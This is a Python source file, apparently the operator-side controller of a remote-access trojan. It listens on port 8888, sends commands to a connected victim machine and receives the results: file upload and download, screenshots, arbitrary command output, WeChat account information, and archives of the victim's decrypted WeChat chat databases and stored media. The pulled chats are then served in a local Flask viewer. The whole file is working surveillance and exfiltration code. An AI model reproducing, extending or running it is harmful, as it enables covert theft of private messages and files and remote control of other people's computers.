# -- coding:UTF-8 --
import socket
import json
import struct
import os
import zipfile
from pathlib import Path
from pywxdump import *

port = 8888
# remote WeChat
remote_decrypted_path = "C:\\desktop\\decrypted"
export_path = "C:\\desktop\\export"
# local WeChat
local_decrypted_path = "./db_decrypted"
db_path = Path(local_decrypted_path) / Path(remote_decrypted_path).name
local_file_storage_path = './wx_FileStorage'


def get_file(conn):
    # 文件不存在的情况
    rev = conn.recv(1024)
    if rev == b'file_not_exist':
        print('[-] 文件不存在')
        return
    conn.send(b'start')
    # 接收文件头部大小
    try:
        rev = conn.recv(4)
        header_size = struct.unpack('i', rev)[0]
    except (struct.error, ConnectionResetError):
        print("[-] 在接收文件头部长度时发生错误")
        return
    # 发送确认消息
    conn.send(b'size_ok')
    # 接收文件头部信息
    header_bytes = conn.recv(header_size).decode('UTF-8')
    header = json.loads(header_bytes)
    file_name = header['file_name']
    file_size = header['file_size']
    # 发送确认消息
    conn.send(b'header_ok')
    print(f'[+] 文件名称：{file_name}，文件大小：{file_size} B')
    print('[*] 开始接收文件...')
    try:
        with open(file_name, 'wb') as f:
            while file_size > 0:
                content = conn.recv(1024)
                file_size -= len(content)
                f.write(content)
    except IOError as e:
        print(f"[-] 在写入文件时发生错误: {e}")
        return
    print('[+] 接收文件完成')


def put_file(conn, file_path):
    rev = conn.recv(1024)
    if rev != b'put':
        print('[-] 发送文件失败')
        return
    file_name = Path(file_path).name
    if os.path.isfile(file_path):
        conn.send(b'file_exist')
        rev = conn.recv(1024)
        if rev != b'start':
            print('[-] 发送文件失败')
            return
        file_size = os.path.getsize(file_path)
        header = {
            'file_name': file_name,
            'file_size': file_size
        }
        header_json = json.dumps(header)
        header_bytes = header_json.encode('UTF-8')
        header_size = struct.pack('i', len(header_bytes))
        conn.send(header_size)
        rev = conn.recv(1024)
        if rev != b'size_ok':
            print('[-] 发送文件头部失败')
            return
        conn.send(header_bytes)
        rev = conn.recv(1024)
        if rev == b'header_ok':
            print(f'[+] 文件名称：{file_name}，文件大小：{file_size} B')
            print('[*] 开始发送文件...')
            try:
                with open(file_path, 'rb') as f:
                    while file_size > 0:
                        content = f.read(1024)
                        file_size -= len(content)
                        conn.send(content)
            except Exception as e:
                print(f"An error occurred: {e}")
                conn.send(b'')
            print('[+] 发送文件完成')
    else:
        conn.send(b'file_not_exist')
        print('[-] 文件不存在')


def screen_shot(conn):
    rev = conn.recv(1024)
    if rev != b'screen':
        print('[-] 截图失败')
        return
    conn.send(b'start')
    get_file(conn)


def flask_show():
    # 查看聊天记录
    seg = input('[*] 请输入数据库分段号：')
    args = {
        "mode": "dbshow",
        "msg_path": str(db_path) + f'\\Multi\\de_MSG{seg}.db',  # 解密后的 MSG.db 的路径
        "micro_path": str(db_path) + '\\de_MicroMsg.db',  # 解密后的 MicroMsg.db 的路径
        "media_path": str(db_path) + f'\\Multi\\de_MediaMSG{seg}.db',  # 解密后的 MediaMSG.db 的路径
        "filestorage_path": local_file_storage_path + "\\FileStorage"  # 文件夹 FileStorage 的路径（用于显示图片）
    }
    # 启动flask服务
    from flask import Flask, request, jsonify, render_template, g
    import logging
    app = Flask(__name__, template_folder='./show_chat/templates')
    # 阻止flask在控制台输出日志
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.logger.setLevel(logging.ERROR)

    @app.before_request
    def before_request():
        g.MSG_ALL_db_path = args["msg_path"]
        g.MicroMsg_db_path = args["micro_path"]
        g.MediaMSG_all_db_path = args["media_path"]
        g.FileStorage_path = args["filestorage_path"]
        g.USER_LIST = get_user_list(args["msg_path"], args["micro_path"])

    @app.route('/shutdown', methods=['POST'])
    def shutdown():
        shutdown_func = request.environ.get('werkzeug.server.shutdown')
        if shutdown_func is None:
            raise RuntimeError('Not running with the Werkzeug Server')
        shutdown_func()
        return 'Server shutting down...'

    app.register_blueprint(app_show_chat)
    print("[+] 查看聊天记录服务启动在 http://127.0.0.1:5000 ")
    app.run(debug=False)


def get_wechat_info(conn):
    print('[*] 正在获取微信信息...')
    wx_info = (conn.recv(1024).decode('UTF-8'))
    print(wx_info)


def get_wechat(conn):
    get_wechat_info(conn)
    print('[*] 正在打包拉取微信数据库...')
    conn.send(remote_decrypted_path.encode('UTF-8'))
    get_file(conn)
    # 解压文件
    print('[*] 开始解压数据库...')
    try:
        with zipfile.ZipFile('decrypted.zip', 'r') as zip_file:
            zip_file.extractall(local_decrypted_path)
    except Exception as e:
        print(f"[-] 解压失败: {e}")
        return
    print('[+] 解压数据库完成')
    os.remove('decrypted.zip')
    conn.send(b'get_db_ok')
    print('[*] 正在打包拉取FileStorage...')
    # 获取FileStorage
    get_file(conn)
    # 解压文件
    print('[*] 开始解压FileStorage...')
    try:
        with zipfile.ZipFile('FileStorage.zip', 'r') as zip_file:
            zip_file.extractall(local_file_storage_path)
    except Exception as e:
        print(f"[-] 解压失败: {e}")
        return
    print('[+] 解压FileStorage完成')
    os.remove('FileStorage.zip')


def main():
    try:
        socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_server.bind(('', port))
        socket_server.listen(5)
    except socket.error as e:
        print(f'[-] 发生异常：{e}')
        return
    while True:
        print('[*] 等待客户端连接...')
        try:
            conn, address = socket_server.accept()
        except socket.error as e:
            print(f"[-] 发生错误: {e}")
            continue
        print(f'[+] 接收到客户端连接，来自{address}')
        while True:
            try:
                data = input('>>> ').encode('UTF-8')
            except UnicodeEncodeError as e:
                print(f"[-] 发生错误: {e}")
                continue
            if data == b'exit':
                conn.send(data)
                break
            elif data == b'\n' or data == b'' or data == b' ':
                continue
            conn.send(data)
            command = data.split()
            if command[0] == b'get':
                get_file(conn)
                continue
            elif command[0] == b'put':
                file_path = data.decode('UTF-8').split()[1]
                put_file(conn, file_path)
                continue
            elif command[0] == b'screen':
                screen_shot(conn)
                continue
            elif command[0] == b'wxinfo':
                get_wechat_info(conn)
                continue
            elif command[0] == b'wxchat':
                get_wechat(conn)
                continue
            elif command[0] == b'flask':
                flask_show()
                continue
            else:
                # 如果超过10秒没有收到回复，则跳过
                conn.settimeout(10)
                try:
                    reply = conn.recv(102400000).decode("UTF-8")
                except socket.timeout:
                    continue
                if reply == '':
                    continue
                print(reply)
        rev = input('[*] 是否断开连接？(y/n) ')
        if rev == 'y':
            conn.close()
            socket_server.close()
            break
        else:
            continue


if __name__ == '__main__':
    main()
